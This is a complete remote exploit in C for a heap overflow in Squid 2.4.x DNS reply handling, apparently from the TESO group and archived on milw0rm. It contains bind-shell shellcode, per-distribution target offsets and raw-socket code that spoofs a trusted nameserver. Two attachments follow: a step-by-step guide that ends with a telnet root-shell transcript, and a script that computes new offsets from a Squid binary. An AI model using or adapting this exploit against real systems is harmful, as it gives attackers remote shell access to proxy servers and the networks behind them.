/* 7350squish - x86/linux squid remote exploit
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of TESO Security.
 *
 * The contents of these coded instructions, statements and computer
 * programs may not be disclosed to third parties, copied or duplicated in
 * any form, in whole or in part, without the prior written permission of
 * TESO Security. This includes especially the Bugtraq mailing list, the
 * www.hack.co.za website and any public exploit archive.
 *
 * The distribution restrictions cover the entire file, including this
 * header notice. (This means, you are not allowed to reproduce the header).
 *
 * (C) COPYRIGHT TESO Security, 2001
 * All Rights Reserved
 *
 *****************************************************************************
 * bug found by scut 2001/09/10
 * further research by lorian.
 * exploit by lorian. (beefed up by scut ;)
 *
 * squid-2.4.1/lib/rfc1035.c:278:# logic fuckup, buffer overflow
 */

#define VERSION "0.1"

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include <arpa/nameser.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


typedef struct {
        char *                  desc;           /* distribution */
        unsigned char *         shellcode;
        unsigned int            shellcode_len;

        unsigned long int       retloc;         /* return address location */
        unsigned long int       retaddr;        /* return address */

        /* resource data length, must be (n * 0x40) + 2 */
        unsigned int            rdata_len;

        /* bytes in decoded dns domain until the next chunk starts */
        unsigned int            chunk_start;
} tgt_type;


unsigned char   x86_lnx_loop[] = "\xeb\xfe";

/* x86/linux pic portshell shellcode, by lorian / teso
 * small mods by scut
 *
 * you can exchange it as you like, just obey the conditions:
 *
 *  - sliceable on 4 byte boundaries
 *  - pic in itself (i.e. no jmp/callback tricks, no relative addressing)
 *  - any bytes allowed (NUL, 0x0a, 0x0d, 0x25, ... everything)
 *  - should be small (< 128 bytes at least)
 */
unsigned char   x86_lnx_portshell[] =
        "\x31\xc0"      /* xor   %eax, %eax     */
        "\x99"                  /* cltd                 */
        "\x50"          /* push  %eax           */

        "\xfe\xc0"      /* inc   %al            */
        "\x89\xc3"      /* mov   %eax, %ebx     */

        "\x50"                  /* push  %eax           */
        "\xfe\xc0"      /* inc   %al            */
        "\x50"          /* push  %eax           */

        "\x89\xe1"      /* mov   %esp, %ecx     */
        "\xb0\x66"      /* mov   $0x66, %al     */

        "\xcd\x80"      /* int   $0x80          */
        "\x52"          /* push  %edx           */
        "\x90"                  /* nop                  */

        "\x66\x68\x50\x73"      /* pushw $0x7350 */     /* port number */

        "\x66\x52"      /* push  %dx            */
        "\x89\xe2"      /* mov   %esp, %edx     */

        "\x6a\x10"      /* push  $0x10          */
        "\x52"          /* push  %edx           */
        "\x50"                  /* push  %eax           */

        "\x89\xe1"      /* mov   %esp, %ecx     */
        "\xfe\xc3"      /* inc   %bl            */

        "\x89\xc2"      /* mov   %eax, %edx     */
        "\xb0\x66"      /* mov   $0x66, %al     */

        "\xcd\x80"      /* int   $0x80          */
        "\x90"          /* nop                  */
        "\x90"                  /* nop                  */

        "\x80\xc3\x02"  /* add   $0x02, %bl     */
        "\x90"                  /* nop                  */

        "\xb0\x66"      /* mov   $0x66, %al     */
        "\xcd\x80"      /* int   $0x80          */

        "\x50"          /* push  %eax           */
        "\x52"                  /* push  %edx           */
        "\x89\xe1"      /* mov   %esp, %ecx     */

        "\xfe\xc3"      /* inc   %bl            */
        "\xb0\x66"      /* mov   $0x66, %al     */

        "\xcd\x80"      /* int   $0x80          */
        "\x89\xc3"      /* mov   %eax, %ebx     */

        "\x31\xc9"      /* xor   %ecx, %ecx     */
        "\xb0\x3f"      /* mov   $0x3f, %al     */

        "\xcd\x80"      /* int   $0x80          */
        "\xfe\xc1"      /* inc   %cl            */

        "\xb0\x3f"      /* mov   $0x3f, %al     */
        "\xcd\x80"      /* int   $0x80          */

        "\xb0\x0b"      /* mov   $0x0b, %al     */
        "\x99"          /* cltd                 */
        "\x52"          /* push  %edx           */

        "\x66\x68\x73\x68"      /* pushw  $0x6873 */

        "\x66\x68\x6e\x2f"      /* pushw  $0x2f6e */

        "\x66\x68\x62\x69"      /* pushw  $0x6962 */

        "\x66\x68\x2f\x2f"      /* pushw  $0x2f2f */

        "\x89\xe3"      /* mov   %esp, %ebx     */
        "\x52"          /* push  %edx           */
        "\x53"          /* push  %ebx           */

        "\x89\xe1"      /* mov   %esp, %ecx     */
        "\xcd\x80"      /* int   $0x80          */
        "";

#define X86_LNX_PS_PORT_HIGH    22
#define X86_LNX_PS_PORT_LOW     23


tgt_type targets[] = {
        { "DEBUG: crash target", x86_lnx_loop, sizeof (x86_lnx_loop) - 1,
                0x55555555, 0x66666666, 0x0182, 288 },

/* XXX: not yet working, fixme
        { "Debian sid - squid_2.3.4-2_i386.deb",
                x86_lnx_portshell, sizeof (x86_lnx_portshell) - 1,
                0x080ee434, 0x080dcc2f, 0x0182, 288 },
*/

        { "Debian sid - squid_2.4.1-1_i386.deb",
                x86_lnx_portshell, sizeof (x86_lnx_portshell) - 1,      0x080df07c, 0x080f0f90, 0x0182, 
288 },         { "Debian sid - squid_2.4.1-2_i386.deb",
                x86_lnx_portshell, sizeof (x86_lnx_portshell) - 1,
                0x080df07c, 0x080f0f90, 0x0182, 288 },
        { "Debian sid - squid_2.4.1-3_i386.deb",
                x86_lnx_portshell, sizeof (x86_lnx_portshell) - 1,
                0x080df07c, 0x080f0f90, 0x0182, 288 },
        { "Debian sid - squid_2.4.1-4_i386.deb",
                x86_lnx_portshell, sizeof (x86_lnx_portshell) - 1,
                0x080df59c, 0x080f14b0, 0x0182, 288 },
        { "Debian sid - squid_2.4.1-5_i386.deb",
                x86_lnx_portshell, sizeof (x86_lnx_portshell) - 1,
                0x080df4bc, 0x080f13d0, 0x0182, 288 },
        { "Debian sid - squid_2.4.1-6_i386.deb",
                x86_lnx_portshell, sizeof (x86_lnx_portshell) - 1,
                0x080df4bc, 0x080f2970, 0x0182, 288 },
        { "Debian sid - squid_2.4.2-1_i386.deb",
                x86_lnx_portshell, sizeof (x86_lnx_portshell) - 1,
                0x080df838, 0x080f2cf0, 0x0182, 288 },

        { NULL, 0, 0 },
};

/* how much bytes we have to keep untouched before the first chunk
 * do not touch, except you know exactly what you're doing
 */
#define CHUNK_PM        4


/* our prototypes */
int xp_build (tgt_type *tgt, unsigned char *buf, unsigned long int buf_len);
void usage (char *progname);


/* raw socket and ip prototypes */
int udp_sendpkt (struct sockaddr_in *sin, int s,
        unsigned char *data,
        unsigned short int datalen,
        unsigned long int saddr, unsigned long int daddr,
        unsigned short int sport, unsigned short int dport);
int send_packet (char *nsname, short nsport, char *dest, short port,
        char *buf, int size);
unsigned short in_cksum (unsigned short *addr, int len);


void
usage (char *progname)
{
        fprintf (stderr, "usage: %s [-t <num>] [-p <p#>] <source> <dest>\n\n",
                progname);

        fprintf (stderr, "-t num\tchoose target (0 for list)\n"
                "-p p#\tport of spawned portshell\n"
                "source\tis <source-ip>:<source-port>, of a trusted "
                        "nameserver\n"
                "dest\tis <dest-ip>:<dest-port>, of the squid resolver\n\n");
        fprintf (stderr, "note: the squid resolver is bound to some high "
                        "udp port at startup\n"
                "      time. you have to catch this port number once (it is "
                        "a normal DGRAM\n"
                "      socket). in the default configuration squid only "
                        "trusts the default\n"
                "      nameservers, so you have to spoof that, too. in the "
                        "ideal case you can\n"
                "      sniff the nameserver squid uses.\n\n");

        exit (EXIT_FAILURE);
}


int
main (int argc, char *argv[])
{
        int             len,
                        n;
        char            c;
        char            buffer[512];

        tgt_type *      tgt;
        int             tgt_num = -1;

        char                    srcip[64],
                                dstip[64];
        unsigned short int      srcp,
                                dstp;
        unsigned short          pnum = 0x7350;


        printf ("7350squish - x86/linux squid remote exploit. version "VERSION"\n"
                "lorian & scut\n\n");


        while ((c = getopt (argc, argv, "t:p:")) != EOF) {
                switch (c) {
                case 't':
                        tgt_num = atoi (optarg);
                        break;
                case 'p':
                        if (sscanf (optarg, "%hu", &pnum) != 1)
                                usage (argv[0]);

                        break;
                default:
                        usage (argv[0]);
                        break;
                }
        }

        x86_lnx_portshell[X86_LNX_PS_PORT_HIGH] = (pnum >> 8) & 0xff;
        x86_lnx_portshell[X86_LNX_PS_PORT_LOW] = pnum & 0xff;


        if (tgt_num < 0) {
                fprintf (stderr, "WARNING: no target selected, using default\n");
                tgt_num = 1;
        }

        if (tgt_num == 0 ||
                tgt_num >= (sizeof (targets) / sizeof (tgt_type)))
        {
                if (tgt_num != 0)
                        printf ("WARNING: target out of list. giving list\n\n");

                printf ("num . description\n");
                printf ("----+-------------------------------------------------------\n");

                for ( ; targets[tgt_num].desc != NULL ; ++tgt_num)
                        printf ("%3d | %s\n", tgt_num + 1,
                                targets[tgt_num].desc);

                printf ("    '\n");

                exit (EXIT_SUCCESS);
        }

        if ((argc - optind) != 2)
                usage (argv[0]);

        if ((sscanf (argv[optind], "%63[^:]:%hu", srcip, &srcp) != 2) ||
                (sscanf (argv[optind + 1], "%63[^:]:%hu", dstip, &dstp) != 2))
        {
                usage (argv[0]);
        }


        tgt = &targets[tgt_num - 1];

        printf ("TARGET: %s\n", tgt->desc);
        printf ("OFFSET: 0x%08lx (retloc)  0x%08lx (retaddr)  %u/%u\n",
                tgt->retloc, tgt->retaddr, tgt->rdata_len, tgt->chunk_start);
        printf ("DIRECT: %s %hu -> %s %hu\n", srcip, srcp, dstip, dstp);
        printf ("\n");


        len = xp_build (tgt, buffer, sizeof (buffer));
        printf ("- build %d byte exploitation buffer\n", len);
        printf ("- sending... ");
        fflush (stdout);

        n = send_packet (srcip, srcp, dstip, dstp,
                (unsigned char *) &buffer, len);
        if (n == -1) {
                printf ("failed. exiting\n");

                exit (EXIT_FAILURE);
        }

        printf ("done.\n");

        printf ("\n- try \"telnet %s %hu\" now.\n", dstip, pnum);
        printf ("\n");

        exit (EXIT_SUCCESS);
}


/* xp_build
 *
 * build exploitation buffer for target `tgt', into `buf', which is `buf_len'
 * bytes long. no boundary checking is done, `buf' must be large enough
 *
 * return length of constructed packet
 */

int
xp_build (tgt_type *tgt, unsigned char *buf, unsigned long int buf_len)
{
        int             n;
        unsigned char * w;              /* walker */
        unsigned char * xpb;            /* exploitation buffer */
        unsigned char * chunk;
        HEADER *        hdr = (HEADER *) buf;


        memset (buf, '\x00', buf_len);

        /* setup bogus reply header
         */
        hdr->id = 0x7350;
        hdr->qr = 1;
        hdr->opcode = ns_o_query;
        hdr->aa = 1;
        hdr->rcode = ns_r_noerror;
        hdr->rd = hdr->ra = 1;

        hdr->qdcount = htons (0x0001);
        hdr->ancount = htons (0x0002);
        hdr->nscount = hdr->arcount = htons (0x0000);

        w = buf + sizeof (HEADER);

        /* bogus NUL query */
        *w++ = '\x00';
        PUTSHORT (ns_t_a, w);           /* type */
        PUTSHORT (ns_c_in, w);          /* class */

        /* and the NUL answer */
        *w++ = '\x00';
        PUTSHORT (ns_t_a, w);           /* type */
        PUTSHORT (ns_c_in, w);          /* class */
        PUTLONG (0x00000537, w);        /* ttl */
        PUTSHORT (0x182, w);            /* TODO: extend */

        xpb = w;

        /* maximum label length blocks
         */
        for (n = tgt->rdata_len / 0x40 ; n > 0 ; --n) {
                *w = '\x3f';
                w += 0x40;
        }

        /* write down shellcode and jmp-ahead nops
         */
        {
                int             wlen;   /* walking length */
                unsigned char * stp;    /* store pointer */
                unsigned char * scp;    /* shellcode pointer */
                unsigned char * codestart;      /* upper end of stored shellcode */

                /* make scp point to the last byte of the shellcode, then
                 * walk the entire mess backwards, copying and slicing the
                 * code into 4 byte chunks
                 */
                scp = tgt->shellcode + tgt->shellcode_len;

                stp = xpb + tgt->chunk_start - CHUNK_PM;
                wlen = tgt->chunk_start - CHUNK_PM - 1;
                wlen %= 0x40;
//              wlen = 0x3f;

                for ( ; scp > tgt->shellcode ; ) {
                        int     clen;

                        clen = 4;
                        if ((scp - tgt->shellcode) < clen)
                                clen = scp - tgt->shellcode;

                        memcpy (stp - clen, scp - clen, clen);
                        stp -= clen;
                        scp -= clen;
                        wlen -= clen;

                        if (wlen < 4) {
                                memcpy (stp - wlen, "\x90\x90\x90", wlen);
                                stp -= wlen + 1;

                                /* jump ahead (over domain length byte)
                                 */
                                *--stp = '\x01';
                                *--stp = '\xeb';

                                wlen = 0x3f - 2;
                        }

                }
                codestart = stp;

                /* now, fill the rest with jump-ahead nops
                 */
                while (stp > xpb) {
                        for ( ; wlen >= 2 ; wlen -= 2) {
                                unsigned int    dist;

                                dist = codestart - stp;
                                if (dist >= 0x80)
                                        dist = 0x7e;

                                *--stp = (unsigned char) dist;
                                *--stp = '\xeb';
                        }

                        if (wlen == 1) {
                                *--stp = '\x90';
                                wlen -= 1;
                        }

                        stp -= 1;       /* label lenght byte */
                        wlen = 0x3f;
                }
        }

        n = tgt->rdata_len % 0x40;
        if (n != 2) {
                fprintf (stderr, "invalid remaining buffer space\n");

                exit (EXIT_FAILURE);
        }

        *w++ = '\xc0';  /* compression marker for last label */
        *w++ = '\x0c';  /* directly after HEADER */


        /* second answer */
        *w++ = '\xc0';
        *w++ = '\x1c';
        PUTSHORT (ns_t_a, w);
        PUTSHORT (ns_c_in, w);
        PUTLONG (0x00000537, w);
        PUTSHORT (0x0000, w);


        /* now to the messy details ;)
         * we overflow the buffer the domain is decoded to, hence we need to
         * align our dns packet buffer to the decoded buffer (+1). the chunk
         * will be at tgt->chunk_start then.
         */
        chunk = xpb + 1 + tgt->chunk_start;

        /* XXX: wtf do we need this? (fails w/o tho)
         */
        chunk[-4] = chunk[-3] = chunk[-2] = chunk[-1] = '\x00';
        /* prev_size = NULL */
        chunk[0] = chunk[1] = chunk[2] = chunk[3] = '\x00';
        /* little endian this_size: 64 bytes with PREV_INUSE set */
        chunk[4] = '\x41';
        chunk[5] = chunk[6] = chunk[7] = '\x00';

        /* ->fd = retloc - 12 */
        chunk[8] = (tgt->retloc - 12) & 0xff;
        chunk[9] = ((tgt->retloc - 12) >> 8) & 0xff;
        chunk[10] = ((tgt->retloc - 12) >> 16) & 0xff;
        chunk[11] = ((tgt->retloc - 12) >> 24) & 0xff;

        /* ->bk = retaddr, XXX: retaddr[8] to retaddr[11] will be crushed */
        chunk[12] = tgt->retaddr & 0xff;
        chunk[13] = (tgt->retaddr >> 8) & 0xff;
        chunk[14] = (tgt->retaddr >> 16) & 0xff;
        chunk[15] = (tgt->retaddr >> 24) & 0xff;

        /* create a second fake chunk (prev_size = NULL, this_size = pad) */
        chunk += 0x40;
        chunk[0] = chunk[1] = chunk[2] = chunk[3] = '\x00';
        chunk[4] = '\x48';
        chunk[5] = '\x01';
        chunk[6] = chunk[7] = '\x00';


        return ((int) (w - buf));
}



/* XXX: where is the following stuff ripped from? -sc */

/* Send faked UDP packet. */
int
udp_sendpkt (struct sockaddr_in *sin, int s,
        unsigned char *data,
        unsigned short int datalen,
        unsigned long int saddr, unsigned long int daddr,
        unsigned short int sport, unsigned short int dport)
{
        struct iphdr    ip;
        struct udphdr   udp;
        char            packet[8192];

        /* Fill in IP header values. */
        ip.ihl = 5;
        ip.version = 4;
        ip.tos = 0;
        ip.tot_len = htons (28 + datalen);
        ip.id = 0x7350;
        ip.frag_off = 0;
        ip.ttl = 255;
        ip.protocol = IPPROTO_UDP;
        ip.check = 0;
        ip.saddr = saddr;
        ip.daddr = daddr;
        ip.check = in_cksum ((unsigned short *) &ip, sizeof(ip));

        /* Fill in UDP header values. Checksums are unnecassary. */
        udp.source = htons (sport);
        udp.dest = htons (dport);
        udp.len = htons (8 + datalen);
        udp.check = (unsigned short) 0;

        /* Copy the headers into our character array. */
        memcpy (packet, (char *) &ip, sizeof (ip));
        memcpy (packet + sizeof (ip), (char *) &udp, sizeof (udp));
        memcpy (packet + sizeof (ip) + sizeof (udp), (char *) data, datalen);

        return (sendto (s, packet, sizeof (ip) + sizeof (udp) + datalen, 0,
                (struct sockaddr *) sin, sizeof (struct sockaddr_in)));
}


int
send_packet (char *nsname, short nsport, char *dest, short port, char *buf,
        int size)
{
        int                     fd,
                                socktolen;
        struct sockaddr_in      sockto;
        struct in_addr          in,
                                ns;
   =20
        fd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (fd == -1) {
                perror ("unable to create raw socket:");

                exit (EXIT_FAILURE);
        }

        socktolen = sizeof (struct sockaddr_in);

        inet_aton (dest, &in);
        inet_aton (nsname, &ns);
   =20
        socktolen = sizeof (struct sockaddr_in);
        memset (&sockto, 0, socktolen);

        sockto.sin_family = AF_INET;
        sockto.sin_port = htons (port);
        sockto.sin_addr.s_addr = in.s_addr;
   =20
        return (udp_sendpkt (&sockto, fd, buf, size, ns.s_addr, in.s_addr,
                nsport, port));
}


unsigned short
in_cksum (unsigned short *addr, int len)
{
        int                     nleft = len;
        int                     sum = 0;
        unsigned short          answer = 0;
        unsigned short *        w = addr;

        while (nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }

        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }

        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;

        return (answer);
}


--k+w/mQv8wyuph6w0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="7350squish.txt"



exploitation
============

Squid uses the same UDP port all the time for its resolver. You have to find
this port number. Also, you need to find the trusted nameserver and its port
(always 53). Some Squids trust every nameserver, but most (default) do only
trust the default nameserver. So you either have to be in the local LAN or be
able to spoof packets from the trusted nameservers address. The UDP port
number is high ephemeral and for most Linux installations, it is somewhere
around (32768 - 32900). The offsets are tight, you will have to get the exact
stuff or brute long. Since you attack the child process of Squid, which gets
restarted on crash, you have unlimited tries. Each try creates two log entries
in the squid logfile.

Exploitation example:
---------------------

192.168.144.6 is the Squid server, 130.149.17.5 the default nameserver it uses
and trusts.

# tcpdump -n src 192.168.144.6 and udp and dst port 53 &
# (echo "HEAD http://test.ts/ HTTP/1.0" ; echo ) | \
        nc 192.168.144.6 3128 >/dev/null
18:57:03.070418 192.168.144.6.32819 > 130.149.17.5.53:  9+ A? test.ts. (25) (DF)
                              ^^^^^
We see the sourceport it uses and the trusted nameserver address.

# ./7350squish -t 3 -p 4050 130.149.17.5:53 192.168.144.6:32819 \
        2>&1 >/dev/null

After the packet has been send, we need to trigger the resolver a second time
to let it read our packet.

# (echo "HEAD http://test2.ts/ HTTP/1.0" ; echo) | \
        nc 192.168.144.6 3128 >/dev/null
# telnet 192.168.144.6 4050
Trying 192.168.144.6...
Connected to 192.168.144.6.
Escape character is '^]'.
id;
uid=0(root) gid=13(proxy) euid=13(proxy) groups=13(proxy)


On some systems, Squid runs as uid=0 (for some strange reason I've to figure
out), debian sid for example.


offsets
=======

retloc:
-------

Any GOT entry that is used often will do fine:

# objdump --dynamic-reloc /usr/sbin/squid | grep memcpy
080df838 R_386_JUMP_SLOT   memcpy

retaddr:
--------

There are multiple places we can return to, but this is the most fixed one
(static lower heap buffer).


# ltrace -o out -p `ps auxwww|egrep "\(squid\)"|awk '{print $2}'`

(on another term, use the squid, as in):

# (echo "HEAD http://www.cow.org/ HTTP/1.0";echo) | nc 127.0.0.1 3128

(now abort the ltrace process).

# grep recvfrom out

Will give output like:

1630 recvfrom(5, 0x080f2c60, 512, 0, 0xbfff79bc)  = 116
1630 recvfrom(5, 0x080f2c60, 512, 0, 0xbfff79bc)  = -1
                 ^^^^^^^^^^

retaddr = 0x080f2c60 + 0x90 = 0x080f2cf0


alignments:
-----------

The default (0x0182, 288) should be just fine. If not, those are more
difficult to get.




--k+w/mQv8wyuph6w0
Content-Type: text/x-sh; charset=us-ascii
Content-Disposition: attachment; filename="offset-find.sh"

#!/bin/sh

# 7350squish offset finder
# lorian & scut

check_util ()
{
        for util in $*; do
                echo -n "checking for $util: "
                if ! which $util; then
                        echo "not found, aborting"
                        exit
                fi
        done
}

echo "7350squish exploit offset finder"
echo

if [ $# != 1 ]; then
        echo "usage: $0 /path/to/squid/binary"
        echo
        exit
fi;


check_util awk objdump

echo

bufferbase=`objdump -D $1 2>/dev/null | \
        grep "68 00 02 00 00" -A 1 | tail -1 | cut -d '$' -f2`

retaddr=`echo $bufferbase | awk 'function hex2num(s)
{
        n = length (s)
        v = 0
        for (i = 1; i < n-1; i++) {
                c = tolower(substr (s, i+2, 1));
                if (c=="a") c=10;
                if (c=="b") c=11;
                if (c=="c") c=12;
                if (c=="d") c=13;
                if (c=="e") c=14;
                if (c=="f") c=15;
                v = v * 16 + c;
        }
        return v
}
{
        printf ("0x%08x\n", hex2num ($0) + 144)
}'`

#retaddr=`echo $bufferbase | awk '{ printf ("0x%08x\n", $0 + 144) }'`

retloc=`objdump -R $1 2>/dev/null | \
        grep "memcpy$" | awk '{ printf ("0x%s", $1) }'`

echo "{ \"NEW TARGET\","
echo "x86_lnx_portshell, sizeof (x86_lnx_portshell) - 1,"
echo "$retloc, /* GOT: memcpy */"
echo "$retaddr, /* packet receive buffer + 0x90 */"
echo "0x0182, 288 },"
echo

echo finished.

// milw0rm.com [2002-05-14]
